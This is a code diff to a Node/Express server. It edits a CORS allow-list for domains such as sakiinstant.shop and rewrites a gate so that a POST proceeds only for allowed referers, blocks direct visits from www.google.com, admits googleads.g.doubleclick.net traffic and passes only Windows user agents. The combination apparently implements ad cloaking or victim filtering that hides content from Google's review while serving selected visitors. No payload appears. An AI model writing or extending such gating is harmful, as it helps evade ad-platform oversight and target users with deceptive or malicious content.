@@ -8,13 +8,13 @@ const PORT = 3000 || process.env.PORT;
 // List of allowed frontend origins for CORS
 const allowedOrigins = [
   "https://thaibasiljp.com",
-"https://sakiinstant.shop",
-"https://sakiinstant.shop/",
-"http://sakiinstant.shop",
-"http://sakiinstant.shop/",
-"http://thaibasiljp.com",
-"http://127.0.0.1:5501",
-"http://127.0.0.1:5500",
+  "https://sakiinstant.shop",
+  "https://sakiinstant.shop/",
+  "http://sakiinstant.shop",
+  "http://sakiinstant.shop/",
+  "http://thaibasiljp.com",
+  "http://127.0.0.1:5501",
+  "http://127.0.0.1:5500",
 ];
 
 // Normalize referer function to handle trailing slashes
@@ -25,15 +25,18 @@ const isWindowsOS = (userAgent) => {
   return userAgent.includes("Windows");
 };
 
-// Helper function to check if the referer is not Google
-const isNotGoogleReferrer = (referer) => {
-  if (!referer) return true; // No referer, proceed with the request
+// Adjusted helper function to specifically block "https://www.google.com/"
+// and allow "https://googleads.g.doubleclick.net"
+const isAllowedReferrer = (referer) => {
+  if (!referer) return true; // Proceed if no referer
 
-  const parsedUrl = url.parse(referer, true);
-  const hostname = parsedUrl.hostname;
-
-  // Check if the hostname does not include 'google'
-  return !hostname.includes("google");
+  const hostname = new URL(referer).hostname;
+  // Block direct visits from www.google.com
+  if (hostname === "www.google.com") {
+    return false;
+  }
+  // Allow visits from googleads.g.doubleclick.net or any other source
+  return true;
 };
 
 // CORS configuration
@@ -62,12 +65,12 @@ app.post(
     const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
     console.log(`Referer: ${referer}`); // Log the referer for debugging
 
-    // Enhanced check: allowed origins, not from Google, and is Windows OS
+    // Check if referer is allowed and OS is Windows
     if (
       allowedOrigins.some((allowedOrigin) =>
         referer.startsWith(allowedOrigin)
       ) &&
-      isNotGoogleReferrer(referer) &&
+      isAllowedReferrer(referer) &&
       isWindowsOS(userAgent)
     ) {
       next();
